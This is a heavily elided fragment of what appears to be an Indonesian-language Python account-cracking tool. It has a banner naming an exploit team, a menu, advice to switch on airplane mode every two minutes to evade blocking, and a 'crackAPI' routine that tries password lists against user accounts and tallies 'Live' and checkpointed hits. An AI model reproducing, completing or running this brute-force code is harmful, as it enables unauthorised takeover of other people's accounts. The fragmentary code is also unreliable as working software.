...
{H}[*] Email       : teamexploit6@gmail.com
{H}[*] Bergabung   : 26 November 1945
{H}[*] ---------------------------------------------
{H}[*] Kadaluwarsa : YNTKTS
...
{M}[P] Keluar
 ...
 [{M}!{C}] hidupkan mode pesawat  setiap 2 menit
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r Crack>> {K}{loop}/{len(internal)}{C} {H}Live:{len(success)}{C} {M}Cp:{len(checkpoint)}{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
  ...
  {M}[>]{C} Postingan: {M}{postingan}{C}
					...
					sys.stdout.write(f"\r [{U}!{C}] {U}Please wait a few minutes sec{C}");sys.stdout.flush();sleep(10)
